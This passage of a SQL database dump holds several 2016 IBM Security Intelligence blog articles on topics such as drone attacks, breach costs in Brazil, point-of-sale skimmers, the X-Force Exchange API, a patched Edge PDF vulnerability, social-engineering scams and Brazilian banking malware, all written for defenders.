Researchers reportedly conducted this exercise to raise awareness to IT departments of vulnerabilities surrounding unencrypted wireless connections, even within secure office space.\n Infiltrating and inserting malicious code into unsecured or   is a known attack vector for fraudsters and cybercriminals to launch MitM attacks and other exploits. This experiment shows that inexpensive, consumer-owned drones can be used to carry out these types of malicious attacks.\n How can organizations defend themselves against these types of threats? Thankfully, drone-led cyberattacks have yet to become mainstream. However, the prospect highlights the need for a potential shift in organizational security.\n In the days before computer technology, bank robbers, shifty employees and economic downturns were the biggest threats to banks and financial institutions. When computer technology emerged along with the World Wide Web, business became global, and financial crime shifted to a mostly faceless, technology-driven threat.\n Drones carrying cyberattack technology pose a threat because they could bypass physical controls. Theoretically, a drone could fly above a major bank or financial institution and conduct a malicious cyberattack from the sky. Such an attack would come without warning and be over before your morning coffee is complete.\n Will organizations have to adopt drone-fighting tactics? Maybe so; there is technology being created to assist in this process.  , for example, is the first backdoor malware developed to hijack drones remotely. MalDrone can reportedly interact with the drone’s device drivers and sensors silently, allowing the attacker to control the drone remotely.\n The technology is unique in that it can attack all drone makes and models, where   were specific to a make and model. This would effectively allow organizations to intercept the malicious attack and take the drone down, fighting a cyberattack with a counterattack.\n Luckily we are not yet living in a world where the threat of drone-led cyberattacks are mainstream. But threats will continue to evolve as fast as technology is created. We must look into all angles of security, both physical and digital, when   to keep organizations safe.', '\'Cyberattacks\', \'Cybersecurity\', \'Data Protection\', \'Privacy\', \'Threat Intelligence\'', 'https://securityintelligence.com/are-drone-led-cyberattacks-the-wave-of-the-future/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (213, 'The True Cost of Cybercrime in Brazil', 'Diana Kelley', '2016-8-4', 'Many cybersecurity eyes have been on Brazil in the run up to this summer’s events. Every system has been under scrutiny, from ticket fraud prevention to the clocks used to time athletes. But cybercrime in this region isn’t a new concern; attackers had set their sights on the country long before summer sports fever hit. Last year, IBM X-Force Executive Security Advisor Limor Kessem detailed the over   Brazil loses to cybercrime. This year’s “ ” report from the Ponemon Institute placed Brazil at the top of its list of places most likely to suffer a material data breach involving 10,000 records or more. The   assessed post-breach costs incurred by 33 Brazilian companies in 12 different industry sectors. The research revealed that the average per capita cost of a data breach (per capita cost and cost per compromised record have equivalent meaning in this report) increased significantly, from R$175 (Brazilian Real) to R$225. The total organizational cost of data breach increased from R$3.96 million to R$4.31 million, according to the report. Some sectors saw a steeper rise in costs than others. Specifically, services, energy and financial services had a per capita data breach cost substantially above the overall mean of R$225, with services topping out at R$398. Meanwhile, public sector, transportation and consumer companies had a per capita cost well below the overall mean value. Taking a look at the global costs year over year, Brazil has a comparatively low total per capita cost of data breach, but there was a significant increase from 2015 to 2016. In general, the more records lost, the higher the overall cost of the data breach.   that suffered breaches of less than 10,000 records incurred an average cost of R$1.88 million. In larger breaches of 50,000 records or more, the cost skyrocketed to R$6.95 million. One additional data point to note: The total cost of a breach goes up if customer churn is a factor. This includes losing a customer due to bad publicity and loss of customer confidence post-breach. When customer churn goes over 4 percent, the added cost of breach management can reach R$5.42 million. That number goes down to R$3.81 million when churn is under 1 percent. Churn rates vary by industry. Services, financial and energy had relatively high churn rates, while the public sector had a low churn rate. The report broke down root cause of data breach into three main categories: malicious or criminal attack, system glitch and human error. Although a system glitch could have been ultimately connected to a human error, the report looked at whether an individual was directly connected to the breach. For example, a web application with a SQLi vulnerability would be categorized as a system glitch, while a user leaving a USB drive with sensitive data at a restaurant would be considered human error. The graphic below represents a summary of the main root causes for the 33 Brazilian organizations in the report. Malicious attacks top the list with 40 percent, while the remaining 60 percent is split evenly between human error and system glitches. Malicious incidents are not only more common, but they’re also more costly. The per capita cost of data loss caused by a malicious incident was R$256. System glitches had an average per capita cost of R$211 and human error was R$200. The good news is that despite the rising costs of breaches, there are steps Brazilian organizations can take to decrease those costs. As shown in the graphic below, having an incident response plan, using encryption, involving the BCM team, and implementing employee training and   can significantly decrease the per capita cost of a data breach. Availability of an incident response team, for example, reduced the average cost of data breach from R$225 to R$192.4 (decreased cost = R$32.6). Conversely, some factors contributed to the increased cost of a breach. These include extensive cloud migration, third-party involvement and lost or stolen devices. A data breach caused by extensive migration to the cloud increased the average cost to as much as R$258.4 (increased cost = R$33.4).', '\'Brazil\', \'Cost of a Data Breach\', \'Cybercrime\', \'Ponemon Institute\', \'X-Force\'', 'https://securityintelligence.com/the-true-cost-of-cybercrime-in-brazil/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (214, 'X-Force Red Gets Serious About Penetration Testing', 'Charles Henderson', '2016-8-2', 'This week,   the creation of X-Force Red, a new elite security testing team. I’ve been working on putting this group together since October of last year, so the announcement gave me a mixture of pride, relief and excitement. I’ve been involved with security testing long enough that creating one more pen testing team wouldn’t be very challenging or rewarding. This is different, mostly because of IBM’s unparalleled stature in technical innovation. In 2015, IBM received 7,355 patents in the U.S., making us the leader for the 23rd consecutive year. With Watson, IBM is pioneering aspects of artificial intelligence and data analytics that not long ago seemed like science fiction. Just last week, I was blown away when the IBM website featured an invitation to “sign up to run virtual experiments on a quantum processor.” I wish that I could say we’re using   at X-Force Red. We’re not quite ready for that, but we still embody IBM’s innovative spirit. Anyone in security can tell you how overwhelming massive amounts of vulnerability data can be. Even in small organizations, findings from penetration tests, code reviews and vulnerability scans pile up quickly.  are a key feature of X-Force Red’s offerings. They help to prioritize and track work, identify security trends in your organization, map risks based on shared dependencies and much more. The data can come from any source: tests performed by IBM, vulnerabilities discovered by your own internal work or even issues documented by third-party tests. There are four main disciplines within X-Force Red: The vast technical experience at IBM is another  . Any decent security testing team will have experts on the common application and network technologies. But when it comes to bleeding-edge, niche or legacy technology, consultants can be left scrambling. X-Force Red is backed by the collective experience of literally hundreds of thousands of the world’s best technologists that work at IBM. Simplicity is another key aspect of the X-Force Red strategy. Filling out scoping surveys and counting your webpages, classes or database servers slows down the testing process and doesn’t improve your security. The details on how we scope and size projects can be found  .', '\'Black Hat\', \'DEF CON\', \'IBM\', \'IBM X-Force Research\', \'Penetration Testing\', \'Security Testing\', \'X-Force\'', 'https://securityintelligence.com/x-force-red-gets-serious-about-penetration-testing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (215, 'Point-of-Sale Hazards: Skimming the Surface of Global Sporting Events', 'Charles Henderson', '2016-8-1', 'As fans converge on major sporting events this summer and throughout the year, criminals are acutely aware that many of the attendees come from high income brackets. The temporary collection of wealthy targets is likely very enticing, and robbing travelers is a global and ancient custom. Travelers around the world are at high risk of robbery, and while payment cards can be much simpler than cash, there is still risk stemming from point-of-sale hazards. When you hand your card to a clerk to run through a point-of-sale (POS) system, how do you know if the  ? The truth is, consumers don’t really know. No one can gauge the security of a modern cash register just by looking at it, and even the friendliest merchants will quickly kick you out for trying your own security testing. Over a decade ago, the Payment Card Industry Data Security Standard (PCI DSS) was created to merge the separate standards of five of the world’s largest payment card companies. Since then, it has played a major role in the operations of merchants across the world, from one-person setups to the world’s largest retailers. The end goal of the   is to keep people using their cards. But there’s another side to PCI DSS: If the requirements become too burdensome (i.e., too expensive), merchants will become unhappy. Large merchants could use their clout to demand change, and small merchants may just stop accepting cards. As a result, PCI DSS is somewhat like a negotiated truce where neither side is completely happy. Many of the concessions are about how closely assessors look at a merchant’s habits to determine if they comply with the standard. Just because a merchant is able to pass a PCI DSS assessment doesn’t mean it is actually secure or even in true compliance. The true determination of compliance occurs  . Forensics investigations routinely reveal implementation flaws — a merchant’s network segmentation is insufficient, default credentials are being used for remote access, not all payment card numbers were encrypted and so on. To start, don’t conflate security and compliance. There’s certainly overlap, but aim higher than just convincing your PCI DSS assessor that you’re compliant. In keeping with the theme from earlier, let’s consider your POS environment. Your vendors may have promised that their software is secure and thoroughly tested. But what was tested, and how thorough is thorough? It’s common for some vendors to take shortcuts by only performing rudimentary testing in an idealized mock environment. That demonstrates that it is technically possible to deploy the product without any obvious flaws, but not much else. When performing tests in actual production environments, it’s very common to see misconfigurations that create major vulnerabilities. Similarly, in-depth testing invariably reveals vulnerabilities too complex for automated tools to find. Vulnerable software isn’t the only  . Poor deployment practices can leave retailers open to card skimmers, both software- and hardware-based. Software skimmers are specialized malware packages that monitor POS memory for plaintext card data. Because they may be custom built (or at least custom obfuscated) for a specific attack, they can slip by standard antivirus software. An attacker that has compromised multiple store locations can install the skimming software on hundreds of registers and just wait for the data to start rolling in. At the very least, merchants should require that their vendors provide detailed documentation about the scope and intensity of security testing. Ideally,   should be performed against the actual point-of-sale deployment, even if the administration is performed by a third party. Hardware skimmers are even more devious. Criminals have designed miniature monitoring devices that fit inside normal card readers. When a customer or clerk swipes a card, the monitoring device reads the magnetic stripe at the same time as the legitimate reader. The attacker can wirelessly retrieve the stolen data using a smartphone, perhaps even from the store’s parking lot. The good news for merchants is that physical skimmers don’t scale well. Installing a physical skimmer is very difficult and must be repeated for every device that’s being attacked. Installation requires that the legitimate card reader be dismantled and physically modified to accommodate the skimmer, making it nearly impossible for the attack to be launched while the store is open. As a result, hardware skimmers are usually installed in a shipment of new or replacement card readers. This is where the good news for merchants ends. A sophisticated card skimmer will never communicate directly to the POS system, making it completely invisible from a software point of view. Hardware skimmers can be prevented by strong physical security in stores and throughout the POS hardware supply chain. Some card reader vendors feature tamper-resistant designs that will provide visual or electronic notification when cases are opened. Read the documentation for these features and use them! Train your staff to carefully inspect all new POS hardware and to periodically inspect existing hardware. Distribute photographs from multiple angles of what the card readers should look like. Athletes are rigorously tested for signs of cheating. Ultimately, this is the same strategy that can protect merchants from point-of-sale hazards:   and rigorously test it. Learn more about other cyber hazards at large sporting events by reading the “ .”', '\'Payment Card Industry (PCI)\', \'Payment Card Industry Data Security Standard (PCI DSS)\', \'Point-of-Sale (POS) Systems\', \'X-Force\'', 'https://securityintelligence.com/point-of-sale-hazards-skimming-the-surface-of-global-sporting-events/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (216, 'Re-examining the IBM X-Force Exchange API', 'Doug Franklin', '2016-8-1', 'We published “ ” when the   threat intelligence sharing portal was unveiled in April 2015, but it’s become dated in the year since. It’s time to provide some updates. The basic ideas remain the same, but the palette of available endpoints grew, and two significant changes occurred: Anonymous access disappeared and rate limits (and commercial accounts) appeared. From the perspective of an X-Force Exchange API (XFE API) client, these differences change the authentication method and the details of responses that clients should expect. The rest of this article examines authorized authentication and managing rate limiting. Readers should be familiar with the basic introduction to the API and treat this as an update. The primary documentation for the X-Force Exchange API resides on the  . This page provides a general description of the purpose of each endpoint, as well as the details of the arguments required and the responses provided by the endpoint. That page also describes how to acquire an API key and password. After logging in to the X-Force Exchange portal, follow the instructions to generate an API key and password. The API client needs the API key and password pair to authenticate. The XFE API key and password pairs do not expire. However, only one valid pair can exist at a time for a single user account (IBM ID). If you generate a new API key and password, the old pair will cease to be valid. Record at least the API password somewhere because you cannot retrieve it later; you can only generate a new pair and revokes the old. You can experiment with the API on the public documentation page for the X-Force Exchange API. If you have an API key and password, the page allows you to enter arguments for the different API endpoints, run the request and examine the raw results of the response. Access the page, enter your API key and password in the entry boxes at the top of the page and click refresh. In addition, the documentation page offers the details of the request arguments and the data model for the results of requests to that endpoint. It also provides an example curl command to make the request and an example JSON response. There are a couple of caveats: X-Force Exchange API clients can use any programming language they desire as long as it can create HTTPS requests and receive HTTPS responses. The original article discussed three unaffiliated projects on Github that provide libraries to access the XFE API in three different languages: Since the original article was published, X-Force Exchange developer Cameron Will added the   project on IBM developerWorks to extend X-Force Exchange API access to Node.js clients. These examples may provide all the capabilities a client requires. If not, they provide an excellent basis to start extending in the directions the client needs. X-Force Exchange API provides a secure, RESTful, JSON-based application programming interface for the data housed in XFE. The client makes requests by composing appropriate HTTPS URLs and request headers, and the servers respond with HTTP response codes and JSON formatted data. \n Clients access the API through  . Note that only HTTPS connections are allowed. The servers will refuse connections over HTTP. Note that the X-Force Exchange API fully supports international characters and clients must be prepared to deal with that. Specifically, some existing data uses non-ASCII text, and clients will receive that data in response to appropriate requests. Enumerating the collections, for example, currently produces at least one title that requires client support of non-ASCII text. You have been warned. The HTTP headers of API requests provide the account authentication data. They should also specify the acceptable response format. For example, the headers should include something like: The $TOKEN variable represents the authentication data for the IBM ID. Create this string by concatenating the API key and the API token, with a colon between them. In Python, the client could compose the authorization header’s argument string like this: Other languages use different syntax, but it’s often similar to this example. We remind readers familiar with the original X-Force Exchange API specification that authentication using a single   token is no longer supported, and the portal user interface no longer displays a token value. All API clients must authenticate with   authentication and separate API key and password, as shown. An X-Force Exchange API request identifies the desired endpoint with the first part of the URL path. Some endpoints need only a single path component, like /version, which returns the version information for the XFE. Others endpoints use several path components, such as /user/profile, which retrieves information about the authenticated user. In each case, though, a unique path prefix identifies a single endpoint. With the prefix selecting the desired functionality, the client specifies any parameters to a request in the suffix. The version and user profile endpoints require no parameters. However, the Get IP Report endpoint (/ipr/{ip}) requires the IP address for which a report is desired. The client appends the string rendering of the IP address to the end of the URL. To make a request for an IP address report on 8.8.8.8 (a public Google DNS name server), a client needs to make a request with the URL: The client also needs to ensure that any parameters are encoded to make valid URLs, since some parameters might include characters that are not permitted in a valid URL. In particular, some endpoints provide full text searching of different aspects of the XFE data. These parameters often include characters not allowed in URLs. As mentioned above, the responses can also include characters that require extended support, such as UTF-8. A client’s first indication of the results of their requests will be the HTTP response code returned from the server. If the request encounters any problems, the response code indicates the type of problem: If the server returns standard response code 200, the request worked, and the body of the response contains the JSON-formatted response data. The client can interpret the contents of the response with the standard JSON tools and libraries for their platform. A JSON container represents each response payload. It can hold one or more objects, depending on the endpoint the client invoked, and the results the endpoint found. For some endpoints, objects in the JSON container will themselves be containers, and the client will have to navigate the structure to examine all the responsive data. The original article has example responses with different levels of complexity and structure. The HTTP responses include three headers that allow clients to conform to the rate limiting for their account: Each of these headers carries an integer value. The remaining header gives the number of requests the client can make within the current rate limit interval. The limit header gives the total number of requests the client can make in any rate limit interval. The reset header gives the time at which the current rate limit interval will end in UTC epoch seconds. The easiest way to manage the request rate is to just keep making requests until the remaining header returns zero, wait a little while and try again. More ambitious clients can use the headers to implement more complex rate management schemes. A few months ago, IBM Security added the   to X-Force Exchange. Among the first apps added to the App Exchange were ones designed to provide integration between X-Force Exchange and other IBM Security products, including the   system. The App Exchange currently hosts apps supporting integration with a wide variety of systems, as well as custom properties and rules for IBM Security products. Like X-Force Exchange, App Exchange is an open platform, though you must be logged in to X-Force Exchange to download or rate apps. In the time since the X-Force Exchange and XFE API went public, they have garnered a lot of interest. IBM X-Force Exchange currently includes over 200 public collections informing users of everything from threat actors to malware details to X-Force Advisories. It has over 10 times as many private collections as well, allowing user teams to collaborate to defend their networks and systems. The vulnerabilities database now holds over 100,000 publicly disclosed vulnerabilities and expands every month. In addition, the platform itself continues to grow. The project operates on an agile methodology, which provides new features and bug fixes frequently. We hope that this article has piqued your interest and that you will find value in using and contributing to the IBM X-Force Exchange and the IBM Security App Exchange.', '\'Application Programming Interface (API)\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/re-examining-the-ibm-x-force-exchange-api/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (217, 'Hungry Hippos Meet Interactive Cyber Management at Black Hat USA 2016', 'Aidan Knowles', '2016-7-31', 'Cyber defenders need to think on their feet and keep calm when managing serious incidents. A unique, interactive game at this year’s  event will put participants’ cool to the test. The attraction utilizes 3-D printed models, cheap electronic motors, four Arduinos and repurposed components from the popular board games Hungry Hungry Hippos and Mind Flex. Jason Flood and John Clarke, two cybersecurity specialists from the IBM Ireland Lab, are behind the DIY project. “As a child, the most frantic of all games was Hungry Hungry Hippos. As an adult, it’s cyberattack management,” Flood remarked. One of the goals when creating the project was to make it affordable, accessible and reproducible. “We used open source and low-tech solutions wherever possible. Almost everything is 3-D printed,” explained Clarke. The pair have spent many hours constructing their project for the highly anticipated annual Black Hat security conference, and it will be on display as part of IBM’s exhibitor space during the two-day main event, happening Aug. 3 to 4. Passersby to the IBM booth will be invited to don a headset equipped with brain wave sensors. These  , repurposed from the Mind Flex board game, are powered by interconnected Arduino microcontrollers. The Arduino-improvised network will communicate via APIs to generate brain wave charts, displaying and comparing rival players’ data against each other in real time. This brain activity will directly determine the responsiveness and speed of the corresponding player’s hippo. The lower their brain activity, the quicker the participants’ hippos will move. The player who can manage to stay the most focused will drive his or her hippos the fastest, thereby capturing the most balls and being crowned the winner. “This project represents the franticness of a cyber incident and the need to find your balance. The winning objective is to be calm. It’s a gamified way of controlling your reactions,” Flood revealed. Think you have what it takes to stay calm in crisis and  ? Test your mettle with a game of mind-controlled Hungry Hungry Hippos at Black Hat USA Booth No. 908.', '\'Black Hat\', \'Black Hat USA\'', 'https://securityintelligence.com/hungry-hippos-meet-interactive-cyber-management-at-black-hat-usa-2016/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (218, 'Read From PDF, Write to Edge’s Memory (CVE-2016-0117)', 'Mark Yason', '2016-7-29', 'Segment Heap is a new native heap implementation introduced in Windows 10 that is enabled in Windows apps (formerly called Modern/Metro apps) and certain system processes. This blog post discusses CVE-2016-0117, a vulnerability in the Windows PDF library (WinRT PDF) that triggered my research of the Segment Heap. Early this year, Microsoft patched a vulnerability I discovered in  . The vulnerability is interesting in that it can be used to perform an arbitrary write to Edge’s content process memory, one of the critical elements for remote code execution. But another interesting aspect of the vulnerability is that to perform a reliable arbitrary write in the Edge content process, one needs to perform precise layout manipulation of a heap that is managed by the new heap implementation in Windows 10. The vulnerability ( ,  ) is in WinRT PDF’s PostScript interpreter for Type 4 (PostScript Calculator) functions. PostScript Calculator functions use a subset of the PostScript language operators, which use the PostScript operand stack when performing their functions. The PostScript operand stack is a vector containing 0x65 CType4Operand pointers. Each CType4Operand is a data structure consisting of one DWORD that represents the type and one DWORD representing the value in the PostScript operand stack. The PostScript operand stack and the CType4Operands are allocated from the MSVCRT heap: The issue is that the PostScript interpreter fails to validate if the PostScript operand stack index is past the end of the PostScript operand stack (PostScript operand stack index is 0x65). This leads to a dereference of a CType4Operand pointer located right after the end of the PostScript operand stack. If an attacker is able to implant a target address right after the end of the PostScript operand stack, the attacker will be able to perform a memory write to the target address via a PostScript operation that pushes a value in the PostScript operand stack. In the illustration below, multiple integers (1094795585 or 0x41414141) are pushed to the PostScript operand stack, with the last 0x41414141 pushed to invalid index 0x65 of the PostScript operand stack: Below is a WinDbg session when WinDbg is attached to the Edge content process when the   was triggered: The first item to notice is the address (marked orange) of the memory write operation. It is not controlled in this particular run because heap layout manipulation was not performed. On the other hand, the high 32 bits of the value to write (red) is controlled; its value is from the PostScript Calculator function in the PDF. The next item to notice in the WinDbg session is the PostScript operand stack address (blue). When information about it is dumped, the heap (green) where the PostScript operand stack is allocated is displayed. The MSVCRT heap address is then dumped and verified to be the same heap where the PostScript operand stack was allocated. Finally, the heap listing of the   shows that the MSVCRT heap is managed by the Segment Heap. Reliably implanting the target address right after the end of the PostScript operand stack requires precise heap layout manipulation, which in this case necessitates some level of understanding of how the Segment Heap works. Certain cases, such as the tactic that I will discuss in my talk, require deep understanding of some of Segment Heap’s internals. I will present my research on the internals and the security mechanisms of the Segment Heap at the upcoming   conference. If you’re a security researcher writing proof-of-concept code, seeking to understand the internals of the Segment Heap, or just interested to see how this new heap implementation works, please drop by at my talk, “ .” It will be held Aug. 4, 2016, at 9:45 a.m in the South Seas CDF room.', '\'Black Hat\', \'Black Hat USA\', \'IBM X-Force Research\', \'Microsoft Edge\', \'Vulnerability\', \'Windows\', \'Windows 10\', \'X-Force\'', 'https://securityintelligence.com/read-from-pdf-write-to-edges-memory-cve-2016-0117/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (219, 'Exploring Operating Systems for the Internet of Things', 'Paul Sabanal', '2016-7-27', 'As the Internet of Things (IoT) becomes more and more prevalent, the demand for technologies to manage and secure these connected devices more efficiently becomes greater. An operating system designed specifically for the IoT is one  . While there are currently operating systems capable of handling the requirements of an IoT device, it’s simply not enough. After all, the Internet of Things is not just about the single device; it’s also about the service ecosystem that provides most of the value and functionality to the users. That’s why operating systems developed from the ground-up with IoT in mind are going to be valuable. A couple of these IoT-focused operating systems were announced last year: Microsoft’s Windows 10 IoT and Google’s Brillo. While neither of these operating systems has been officially released, they look promising and are poised to become more significant in the future. They are also potentially interesting targets for security-minded folks —   and defenders alike. For a  , investigating a new technology is a significant part of the job. Understanding the inner workings of a complex technology such as a new operating system, especially in an exploding field like IoT, is very exciting. It also goes without saying that assessing the security of these connected devices will become an important part of a security researcher’s job in the future. When assessing IoT devices, we need to think about their attack surface. This includes network communications between the device and its service ecosystem, network services running on the device and the applications running on the device. We need to know if it communicates securely with the cloud. We also need to know what services are running and if they even need to be running at all. In the event an attacker gains access, we need to know the extent of   they can do. To do all this, we must know the various techniques and methods of analyzing a device. Only after understanding and doing all this can we make effective recommendations to manufacturers and users regarding how to secure these devices. I will be giving a talk about the attack surface and security assessment of the Windows 10 IoT Core operating system at this year’s   conference. My talk, titled “ ,” is scheduled for Aug. 3, 2016, at 3 p.m. in the South Seas IJ room. Hope to see you there!', '\'Black Hat USA\', \'Connected Devices\', \'Endpoint\', \'Endpoint Protection\', \'Endpoint Security\', \'Internet of Things (IoT)\', \'Security Conferences\', \'X-Force\'', 'https://securityintelligence.com/exploring-operating-systems-for-the-internet-of-things/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (220, 'Social Engineering and the Stranded Sports Fan', 'Charles Kolodgy', '2016-7-25', 'Nearly half a million people will take in the pageantry, competition, drama and electric atmosphere of the 2016 summer sports event in Rio de Janeiro. But the trip can quickly turn into a nightmare for tourists who fall victim to  . Visitors should be on particularly high alert for the stranded traveler scam. In an effort to solicit money, cybercriminals gain access to a victim’s email account and disseminate messages to contacts found in the address book. The emails claim that the victim is in distress in a foreign country and desperate for immediate cash. To add insult to injury, you don’t even need to be on your dream vacation to become the unwitting pawn of cybercriminals; the perpetrators can simply claim you are traveling. Fraudsters have used the stranded traveler email scam since at least 2008. The FBI issued a warning in July 2010 about the growth of the scam. By 2012, the FBI’s Internet Crime Complaint Center reported that they had about 150,000 related complaints on file, according to  . Although it is not as pervasive as it once was, this fraud continues to ensnare many people. The volume of stranded traveler incidents tends to rise during high-profile worldwide events, such as the World Cup, because it is more plausible that someone is attending the event and might be in dire need of assistance. \n The basic mechanism of the scheme is the initial breach of the victim’s email account. In many instances, the cybercriminal gains access to the victim’s social media accounts as well. No one is immune to this type of takeover by social engineering. Even Facebook founder Mark Zuckerberg   when malicious actors gained access to his Twitter, Pinterest and LinkedIn accounts. Following the account takeover, the attacker will message everyone listed on the contact list. The email contains a tale of woe and requests money, which, of course, will be repaid when the stranded person is back home. To make it more difficult to uncover the scheme, many attackers change the account password, redirect return emails and delete the address book for good measure. This   scheme is often successful because the email comes from a familiar person. Most people’s immediate reaction is to pity and help the friend, relative or colleague who appears to be in real trouble. The plea originates from an address that you recognize (including the appropriate headers should you investigate) and is likely to include the person’s real name and signature. In this way, it seems to be legitimate. The appeal is additionally persuasive if you know that someone is traveling to the location stated in the message. It only takes a few compassionate friends to act quickly to make the trick profitable for the criminals. After you get over the initial shock of seeing a stranded traveler communication, you as recipient may notice a number of suspicious elements that tip you off to the scam. First, the message may be riddled with clumsy word usage, incorrect grammar, and improper punctuation and capitalization. Secondly, the note may be addressed to a generic friend, not personalized directly to you. Social engineering can only do so much. Third, ask yourself why you are being contacted to help. Is this something this person would request of you? Is this person even traveling to  ? You may not notice these signs because you’re caught up in the emotion of the moment. A request to wire cash to someone is the ultimate red flag. Because it is relatively easy to uncover this scam, fraudsters are motivated to work harder. According to the U.S. National Counterintelligence Executive Bill Evanina, the summer event in Rio will represent a  . In the spirit of competition, we will categorize the level of effort in executing the stranded traveler scam as gold, silver and bronze. The scammer performs the basic level of effort. The message will be impersonal and unconvincing. Everyone on the mailing list will be contacted. Payment will be a simple wire transfer. It will be unknown if the target person is traveling. At this level, the attackers will be more selective in trying to send emails to close friends and relatives. The message content will appear realistic. They will lock the user from the accounts, wipe the victim’s address book and set up a new email address that messages can be sent to. The silver level of fraudster may even communicate directly with people who want to wire money. In this situation, the attacker doesn’t verify that the subject (i.e., the stranded traveler) is on vacation. A con going for the gold will be difficult to discover and will probably be profitable. This will be a targeted attack. These masters of social engineering will know that the target is attending the international sporting event, most likely by   for information, and will then target and infiltrate the accounts of those travelers. After confiscating accounts, they will only reach out to the closest contacts and will personalize all the notes. By scouring the personal information they have access to, they can add touches that might put the reader at ease. The fraudsters will set up a message redirect to allow them to receive and send emails. They might even update a Facebook page or send out tweets to reinforce the fictitious story. The best of the best will offer up a phone number for the hotel or of a local authority that is aiding the stranded traveler. This level of criminal may be willing to take a debit card for payment. The nightmare isn’t so much the act of the scam but the cleanup and impact to your extended contacts. Unlike other internet tricks designed to impact a single person, the stranded traveler fraud has many potential victims. The first victim is the person whose identity is misappropriated. The other victims are the people who are contacted. In some cases, the numbers can be considerable. One bronze-level cybercriminal gained access to the account of a person who runs a charity and sent a deceitful message to  . Should you succumb to the heart-wrenching appeal and send money, your interaction with online bandits may just be beginning; as a victim, you may be targeted as an easy mark. For example, ABC News investigated such a scam and sent the fraudsters $20 to learn more. Soon afterwards, the organization began to receive new phishing emails. The purported stranded traveler faces the embarrassment of needing to inform people that this is a scam. Many hours are spent answering calls and emails from friends and acquaintances to let them know you are safe. This process can go on for a week or more given that some emails will not be read immediately. There can be considerable guilt should someone you know lose money trying to help you. Lastly, there is time and effort required to restore access to your email and social media accounts. In many cases, should your contact lists and email history be erased, those might need to be reconstructed from scratch. Safeguards against the stranded traveler scam and   are different for the two types of victims. On the traveler side, the key is to ensure that your email and social media accounts have strong passwords. You do not reuse passwords across accounts, and you should change them periodically and utilize two-factor authentication when offered. You must also be wary of phishing emails, which can be used to install malware that in turn passes login information to attackers. Travelers should be careful when using public Wi-Fi, which can be an avenue into accounts. The goal of these defensive activities is to prevent account hijacking. On the other side of the equation, when an acquaintance emails you with a fantastic tale of misfortune that depicts them as a stranded traveler, you should consider the story with a healthy level of skepticism. If someone asks you to wire them money in a foreign nation, you can have a high level of confidence that it is a hoax being perpetrated by cybercriminals. If you remain concerned about the safety of the friend, contact them or someone close to them, preferably by phone or text. To learn more about the threats affecting Brazil, read the   from IBM X-Force.', '\'Fraud\', \'Fraud Prevention\', \'Phishing\', \'Phishing Emails\', \'Social Engineering\', \'Social Media\', \'Social Media Security\'', 'https://securityintelligence.com/social-engineering-and-the-stranded-olympic-traveler/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (221, 'The Brazilian Malware Landscape: A Dime a Dozen and Going Strong', 'Limor Kessem', '2016-7-21', 'Cybercrime is undoubtedly one of Brazil’s greatest challenges. Unlike other parts of the world, Brazil is targeted mostly by local criminals. Malware facilitates the most prolific type of cybercrime attacks in Brazil. Because Brazilian malware tends to be less sophisticated than malware made in Eastern Europe, cybercriminals in Brazil compensate with attack volume. This trend is beginning to change, however, as criminals are increasingly collaborating with Russian-speaking actors to buy and offer malware in the Brazilian cybercrime market. Why do Brazilian cybercriminals rarely use advanced malware such as Zeus, Neverquest or Tinba? The answer is simple: No need to shoot a fly with a cannonball. If it works, that’s a good enough reason for cybercriminals to keep using it. Below is a list of the top malware threats employed in Brazil against banking and payment users. One of the most common malware traits in the Brazilian cybercrime landscape is the use of Delphi-based code. It’s possible that its overall utility and simplicity   among small-time criminals who make or buy Delphi-based malcode, mostly because they can easily understand and customize it. Unlike modern day banking Trojans such as   or  , which must come with a builder to generate new executables each time, Brazilian malware authors sell customizable source code. According to   research, this means that every time someone buys the malware, they modify it as they see fit. That essentially creates new malware without creating a new malware family. For this reason, we see very few distinctive malware families in Brazil. This poses unique security challenges in Brazil compared to those in regions like North America or Europe, for example. It follows that we do not see as many variants of Dridex, Neverquest, Tinba or GozNym in Brazil as we do in other parts of South America. Brazilian cybercriminals have long used phishing scams, sending users to fake bank pages to rob their online banking details. In many modern phishing kits, the code that generates the fake page pulls a lot of the HTML content from the genuine bank’s website. This action can be detected by security solutions and often helps researchers find phishing sites by tracing back the web resource that copies code from the bank’s website. Brazilian criminals did not have to do much to counter this detection. They created a simple image file with a couple of editable fields and found a way to overlay it on the victim’s internet browser window. The image is a screen capture of the bank’s website — no code necessary! It is as simple as it is trendy. While it lacks in sophistication, it is both inexpensive and tricky to detect. While the very simplistic overlay Trojan described above continues to work well, IBM X-Force researchers began seeing an escalation of the  . In the newer attack method, cybercriminals introduced a man-in-the-middle (MitM) element in the form of a malicious remote access tool (RAT). With the RAT, which gives the attacker full control over the victim’s endpoint, fraudsters can steal credentials and follow up with a real-time transaction attempt from the victim’s own endpoint, thus raising less suspicion on the bank’s end. This manual scam is generally known as a Remoto. It leverages the persistence of an overlay screen that blocks the user from seeing or even accessing their actual web browser. While the user is stuck, the criminal simultaneously performs a fraudulent transaction. Victims are then asked for two-factor authentication elements in real time. In this way, victims are socially engineered into helping the attacker without ever knowing that a third party has come between them and the genuine banking session. Another popular trend in the Brazilian malware arena is the fake browser. This technique is conceptually simple: Victims go to their online banking website when their original browser suddenly crashes and automatically re-opens. The second browser is a malicious program created by the criminals to appear exactly like the original. These programs, in most cases, are designed to adapt to the victim’s specific browser. Due to the seamless relaunch of the browser, unsuspecting victims are likely to continue where they left off, often entering their credentials into the fake browser window, inadvertently sending them to the criminal’s drop zone. Once received on the other end, the criminal will use the credentials in an attempt to authenticate an online banking session and perform a 